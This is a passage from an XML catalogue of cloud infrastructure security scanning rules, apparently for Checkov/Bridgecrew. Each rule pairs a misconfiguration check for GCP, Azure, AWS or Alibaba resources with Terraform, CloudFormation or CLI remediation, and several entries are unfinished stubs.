<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud dataproc clusters set-iam-policy CLUSTER-ID policy.json
</code></pre></div></div>
<p>Replace <strong>CLUSTER-ID</strong> with your Dataproc cluster ID.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_dataproc_cluster_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
<li>
<p><strong>Resource</strong>: google_dataproc_cluster_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_dataproc_cluster_iam_member" "editor" {
  cluster = "your-dataproc-cluster"
  role    = "roles/editor"
-  member        = "allUsers"
-  member        = "allAuthenticatedUsers"
}

//Option 2
resource "google_dataproc_cluster_iam_binding" "editor" {
  cluster = "your-dataproc-cluster"
  role    = "roles/editor"
  members = [
-    "allUsers",
-    "allAuthenticatedUsers"
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_144</key>
    <name>Ensure Azure Machine Learning Workspace is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-machine-learning-workspace-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-machine-learning-workspace-is-publicly-accessible"></div>Azure Machine Learning Workspace is publicly accessible</div><a aria-label="Skip link to Azure Machine Learning Workspace is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#azure-machine-learning-workspace-is-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-workspace-is-not-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-workspace-is-not-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-workspace-is-not-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_209</key>
    <name>Ensure AWS cluster logging is encrypted using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></div>AWS cluster logging is not encrypted using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS cluster logging is not encrypted using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies cluster logging which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your cluster logging data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">resource "aws_ecs_cluster" "pass2" {
  name = "white-hart"
  configuration {
    execute_command_configuration {
      kms_key_id = aws_kms_key.example.arn

      log_configuration {
        #        cloud_watch_encryption_enabled = true
        # cloud_watch_log_group_name     = aws_cloudwatch_log_group.example.name

        # or
        # s3_bucket_name=   and
        s3_bucket_encryption_enabled = true
      }
    }
  }
  tags = { test = "fail" }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_42</key>
    <name>Ensure Alibaba Cloud MongoDB instance uses SSL</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-mongodb-instance-does-not-use-ssl"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-mongo-db-instance-does-not-use-ssl"></div>Alibaba Cloud MongoDB instance does not use SSL</div><a aria-label="Skip link to Alibaba Cloud MongoDB instance does not use SSL" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-mongodb-instance-does-not-use-ssl"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-uses-ssl' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-uses-ssl</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-uses-ssl' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_143</key>
    <name>Ensure Azure AKS cluster nodes do not have public IP addresses</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-aks-cluster-nodes-have-public-ip-addresses"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-aks-cluster-nodes-have-public-ip-addresses"></div>Azure AKS cluster nodes have public IP addresses</div><a aria-label="Skip link to Azure AKS cluster nodes have public IP addresses" class="heading-anchor-icon fa fa-anchor" href="#azure-aks-cluster-nodes-have-public-ip-addresses"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-aks-cluster-nodes-do-not-have-public-ip-addresses' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-aks-cluster-nodes-do-not-have-public-ip-addresses</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-aks-cluster-nodes-do-not-have-public-ip-addresses' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_246</key>
    <name>Ensure AWS RDS Cluster activity streams are encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-cluster-activity-streams-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-cluster-activity-streams-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cm-ks"></div>AWS RDS Cluster activity streams are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS RDS Cluster activity streams are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-cluster-activity-streams-are-not-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies RDS Cluster activity streams which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your RDS Cluster activity streams data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_rds_cluster_activity_stream"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-rds-cluster-activity-stream"></div>Resource: aws_rds_cluster_activity_stream</div><a aria-label="Skip link to Resource: aws_rds_cluster_activity_stream" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_rds_cluster_activity_stream"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-kms_key_id"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-kms-key-id"></div>Arguments: kms_key_id</div><a aria-label="Skip link to Arguments: kms_key_id" class="heading-anchor-icon fa fa-anchor" href="#arguments-kms_key_id"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_cluster_activity_stream" "pass" {
  resource_arn = aws_rds_cluster.default.arn
  mode         = "async"
  kms_key_id   = aws_kms_key.default.key_id

  depends_on = [aws_rds_cluster_instance.default]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-cluster-activity-streams-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-rds-cluster-activity-streams-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-cluster-activity-streams-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_259</key>
    <name>Ensure AWS CloudFront response header policy enforces Strict Transport Security</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudfront-response-header-policy-does-not-enforce-strict-transport-security"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-front-response-header-policy-does-not-enforce-strict-transport-security"></div>AWS CloudFront response header policy does not enforce Strict Transport Security</div><a aria-label="Skip link to AWS CloudFront response header policy does not enforce Strict Transport Security" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudfront-response-header-policy-does-not-enforce-strict-transport-security"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-response-header-policy-enforces-strict-transport-security' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-response-header-policy-enforces-strict-transport-security</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-response-header-policy-enforces-strict-transport-security' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_12</key>
    <name>Ensure AWS IAM password policy has a number</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-have-a-number"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-have-a-number"></div>AWS IAM password policy does not have a number</div><a aria-label="Skip link to AWS IAM password policy does not have a number" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-have-a-number"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one number, this increases security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Require at least one number</strong>. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --require-numbers
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>All commands starting with <strong>aws iam update-account-password-policy</strong> can be combined into a single command.</p></blockquote> <br/> <a href='https://docs.bridgecrew.io/docs/iam_8' target='_blank'> https://docs.bridgecrew.io/docs/iam_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_230</key>
    <name>Ensure AWS NACL does not allow ingress from 0.0.0.0/0 to port 20</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-nacl-allows-ingress-from-00000-to-port-20"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-nacl-allows-ingress-from-0-0-0-0-0-to-port-20"></div>AWS NACL allows ingress from 0.0.0.0/0 to port 20</div><a aria-label="Skip link to AWS NACL allows ingress from 0.0.0.0/0 to port 20" class="heading-anchor-icon fa fa-anchor" href="#aws-nacl-allows-ingress-from-00000-to-port-20"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Network Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 20. Removing unfettered connectivity to remote console services, such as FTP, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:  
  InboundRule:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
       NetworkAclId:
         Ref: MyNACL
       RuleNumber: 200
       Protocol: 6
       RuleAction: allow
-      CidrBlock: 0.0.0.0/0
+      CidrBlock: 10.0.0.0/32
       PortRange:
         From: 20
         To: 20
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_network_acl_rule" "example" {
  network_acl_id = aws_network_acl.example.id
  rule_number    = 200
  egress         = false
  protocol       = "tcp"
  rule_action    = "allow"
- cidr_block     = "0.0.0.0/0"
+ cidr_block     = "10.0.0.0/32"
  from_port      = 20
  to_port        = 20
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-20' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-20</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-20' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_256</key>
    <name>Ensure AWS DLM cross-region schedules are encrypted using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dlm-cross-region-schedules-are-not-encrypted-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dlm-cross-region-schedules-are-not-encrypted-using-a-customer-managed-key-cmk"></div>AWS DLM cross-region schedules are not encrypted using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS DLM cross-region schedules are not encrypted using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-dlm-cross-region-schedules-are-not-encrypted-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic File DLM cross-region schedules which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your DLM cross-region schedules data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_dlm_lifecycle_policy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-dlm-lifecycle-policy"></div>Resource: aws_dlm_lifecycle_policy</div><a aria-label="Skip link to Resource: aws_dlm_lifecycle_policy" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_dlm_lifecycle_policy"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-cross_region_copy_rulecmk_arn"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-cross-region-copy-rule-cmk-arn"></div>Arguments: cross_region_copy_rule.cmk_arn</div><a aria-label="Skip link to Arguments: cross_region_copy_rule.cmk_arn" class="heading-anchor-icon fa fa-anchor" href="#arguments-cross_region_copy_rulecmk_arn"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">resource "aws_dlm_lifecycle_policy" "pass" {
  description        = "example DLM lifecycle policy"
  execution_role_arn = aws_iam_role.dlm_lifecycle_role.arn
  state              = "ENABLED"

  policy_details {
    resource_types = ["VOLUME"]

    schedule {
      name = "2 weeks of daily snapshots"

      create_rule {
        interval      = 24
        interval_unit = "HOURS"
        times         = ["23:45"]
      }

      retain_rule {
        count = 14
      }

      tags_to_add = {
        SnapshotCreator = "DLM"
      }

      copy_tags = false

      cross_region_copy_rule {
        target    = "us-west-2"
        encrypted = true
